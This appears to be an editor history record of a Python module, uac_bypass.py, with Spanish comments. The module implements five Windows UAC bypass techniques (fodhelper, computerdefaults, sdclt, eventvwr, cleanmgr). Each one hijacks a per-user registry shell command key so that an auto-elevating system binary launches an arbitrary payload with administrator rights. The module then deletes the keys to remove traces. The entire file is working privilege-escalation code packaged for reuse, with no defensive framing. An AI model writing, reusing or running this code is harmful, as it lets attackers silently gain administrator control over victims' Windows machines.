{
    "sourceFile": "src/modules/uac_bypass.py",
    "activeCommit": 0,
    "commits": [
        {
            "activePatchIndex": 0,
            "patches": [
                {
                    "date": 1740264073767,
                    "content": "Index: \n===================================================================\n--- \n+++ \n"
                }
            ],
            "date": 1740264073767,
            "name": "Commit-0",
            "content": "\"\"\"\r\nMódulo de UAC Bypass.\r\nImplementa diferentes técnicas para evadir/bypassear UAC en Windows.\r\n\"\"\"\r\n\r\nimport os\r\nimport sys\r\nimport ctypes\r\nimport winreg\r\nimport logging\r\nimport tempfile\r\nimport subprocess\r\nfrom typing import Dict, Optional, Union\r\nfrom pathlib import Path\r\n\r\nclass UACBypass:\r\n    def __init__(self):\r\n        \"\"\"Inicializa el módulo de UAC Bypass.\"\"\"\r\n        self.temp_dir = tempfile.mkdtemp()\r\n        self.is_admin = ctypes.windll.shell32.IsUserAnAdmin()\r\n        self.techniques = {\r\n            \"fodhelper\": self._fodhelper_bypass,\r\n            \"computerdefaults\": self._computerdefaults_bypass,\r\n            \"sdclt\": self._sdclt_bypass,\r\n            \"eventvwr\": self._eventvwr_bypass,\r\n            \"diskcleanup\": self._diskcleanup_bypass\r\n        }\r\n\r\n    def check_uac_level(self) -> Dict[str, Union[int, str, bool]]:\r\n        \"\"\"\r\n        Verifica el nivel actual de UAC.\r\n        \r\n        Returns:\r\n            Dict con información sobre la configuración de UAC\r\n        \"\"\"\r\n        try:\r\n            key = winreg.OpenKey(\r\n                winreg.HKEY_LOCAL_MACHINE,\r\n                r\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\",\r\n                0,\r\n                winreg.KEY_READ\r\n            )\r\n            \r\n            consent_prompt_behavior = winreg.QueryValueEx(key, \"ConsentPromptBehaviorAdmin\")[0]\r\n            prompt_on_secure_desktop = winreg.QueryValueEx(key, \"PromptOnSecureDesktop\")[0]\r\n            enable_lua = winreg.QueryValueEx(key, \"EnableLUA\")[0]\r\n            \r\n            uac_level = \"Alto\"\r\n            if consent_prompt_behavior == 0:\r\n                if prompt_on_secure_desktop == 0:\r\n                    uac_level = \"Ninguno\"\r\n                else:\r\n                    uac_level = \"Bajo\"\r\n            \r\n            return {\r\n                \"success\": True,\r\n                \"uac_enabled\": bool(enable_lua),\r\n                \"consent_behavior\": consent_prompt_behavior,\r\n                \"secure_desktop\": bool(prompt_on_secure_desktop),\r\n                \"level\": uac_level\r\n            }\r\n            \r\n        except Exception as e:\r\n            logging.error(f\"Error verificando nivel UAC: {e}\")\r\n            return {\"success\": False, \"error\": str(e)}\r\n\r\n    def try_bypass(self, technique: str, payload_path: str) -> Dict[str, Union[bool, str]]:\r\n        \"\"\"\r\n        Intenta realizar un bypass de UAC usando la técnica especificada.\r\n        \r\n        Args:\r\n            technique: Nombre de la técnica a usar\r\n            payload_path: Ruta al ejecutable que queremos elevar\r\n            \r\n        Returns:\r\n            Dict indicando éxito o fracaso\r\n        \"\"\"\r\n        if self.is_admin:\r\n            return {\"success\": False, \"error\": \"Ya se tienen privilegios de administrador\"}\r\n            \r\n        if technique not in self.techniques:\r\n            return {\"success\": False, \"error\": f\"Técnica {technique} no implementada\"}\r\n            \r\n        try:\r\n            return self.techniques[technique](payload_path)\r\n        except Exception as e:\r\n            logging.error(f\"Error en bypass {technique}: {e}\")\r\n            return {\"success\": False, \"error\": str(e)}\r\n\r\n    def _fodhelper_bypass(self, payload_path: str) -> Dict[str, Union[bool, str]]:\r\n        \"\"\"Bypass usando fodhelper.exe.\"\"\"\r\n        try:\r\n            key_path = r\"Software\\Classes\\ms-settings\\Shell\\Open\\command\"\r\n            registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)\r\n            winreg.SetValueEx(registry_key, \"DelegateExecute\", 0, winreg.REG_SZ, \"\")\r\n            winreg.SetValueEx(registry_key, \"\", 0, winreg.REG_SZ, payload_path)\r\n            \r\n            subprocess.Popen(\"fodhelper.exe\")\r\n            return {\"success\": True}\r\n            \r\n        except Exception as e:\r\n            return {\"success\": False, \"error\": str(e)}\r\n        finally:\r\n            try:\r\n                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)\r\n            except:\r\n                pass\r\n\r\n    def _computerdefaults_bypass(self, payload_path: str) -> Dict[str, Union[bool, str]]:\r\n        \"\"\"Bypass usando computerdefaults.exe.\"\"\"\r\n        try:\r\n            key_path = r\"Software\\Classes\\ms-settings\\Shell\\Open\\command\"\r\n            registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)\r\n            winreg.SetValueEx(registry_key, \"DelegateExecute\", 0, winreg.REG_SZ, \"\")\r\n            winreg.SetValueEx(registry_key, \"\", 0, winreg.REG_SZ, payload_path)\r\n            \r\n            subprocess.Popen(\"computerdefaults.exe\")\r\n            return {\"success\": True}\r\n            \r\n        except Exception as e:\r\n            return {\"success\": False, \"error\": str(e)}\r\n        finally:\r\n            try:\r\n                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)\r\n            except:\r\n                pass\r\n\r\n    def _sdclt_bypass(self, payload_path: str) -> Dict[str, Union[bool, str]]:\r\n        \"\"\"Bypass usando sdclt.exe.\"\"\"\r\n        try:\r\n            key_path = r\"Software\\Classes\\Folder\\shell\\open\\command\"\r\n            registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)\r\n            winreg.SetValueEx(registry_key, \"\", 0, winreg.REG_SZ, payload_path)\r\n            \r\n            subprocess.Popen(\"sdclt.exe\")\r\n            return {\"success\": True}\r\n            \r\n        except Exception as e:\r\n            return {\"success\": False, \"error\": str(e)}\r\n        finally:\r\n            try:\r\n                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)\r\n            except:\r\n                pass\r\n\r\n    def _eventvwr_bypass(self, payload_path: str) -> Dict[str, Union[bool, str]]:\r\n        \"\"\"Bypass usando eventvwr.exe.\"\"\"\r\n        try:\r\n            key_path = r\"Software\\Classes\\mscfile\\shell\\open\\command\"\r\n            registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)\r\n            winreg.SetValueEx(registry_key, \"\", 0, winreg.REG_SZ, payload_path)\r\n            \r\n            subprocess.Popen(\"eventvwr.exe\")\r\n            return {\"success\": True}\r\n            \r\n        except Exception as e:\r\n            return {\"success\": False, \"error\": str(e)}\r\n        finally:\r\n            try:\r\n                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)\r\n            except:\r\n                pass\r\n\r\n    def _diskcleanup_bypass(self, payload_path: str) -> Dict[str, Union[bool, str]]:\r\n        \"\"\"Bypass usando cleanmgr.exe.\"\"\"\r\n        try:\r\n            key_path = r\"Software\\Classes\\mscfile\\shell\\open\\command\"\r\n            registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)\r\n            winreg.SetValueEx(registry_key, \"\", 0, winreg.REG_SZ, payload_path)\r\n            \r\n            subprocess.Popen(\"cleanmgr.exe\")\r\n            return {\"success\": True}\r\n            \r\n        except Exception as e:\r\n            return {\"success\": False, \"error\": str(e)}\r\n        finally:\r\n            try:\r\n                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)\r\n            except:\r\n                pass\r\n\r\n    def cleanup(self):\r\n        \"\"\"Limpia archivos temporales y modificaciones del registro.\"\"\"\r\n        try:\r\n            # Limpiar directorio temporal\r\n            if os.path.exists(self.temp_dir):\r\n                for root, dirs, files in os.walk(self.temp_dir, topdown=False):\r\n                    for name in files:\r\n                        try:\r\n                            os.remove(os.path.join(root, name))\r\n                        except:\r\n                            pass\r\n                    for name in dirs:\r\n                        try:\r\n                            os.rmdir(os.path.join(root, name))\r\n                        except:\r\n                            pass\r\n                try:\r\n                    os.rmdir(self.temp_dir)\r\n                except:\r\n                    pass\r\n            \r\n            # Limpiar claves del registro\r\n            registry_paths = [\r\n                r\"Software\\Classes\\ms-settings\\Shell\\Open\\command\",\r\n                r\"Software\\Classes\\Folder\\shell\\open\\command\",\r\n                r\"Software\\Classes\\mscfile\\shell\\open\\command\"\r\n            ]\r\n            \r\n            for path in registry_paths:\r\n                try:\r\n                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, path)\r\n                except:\r\n                    continue\r\n                    \r\n        except Exception as e:\r\n            logging.error(f\"Error en limpieza: {e}\")\r\n"
        }
    ]
}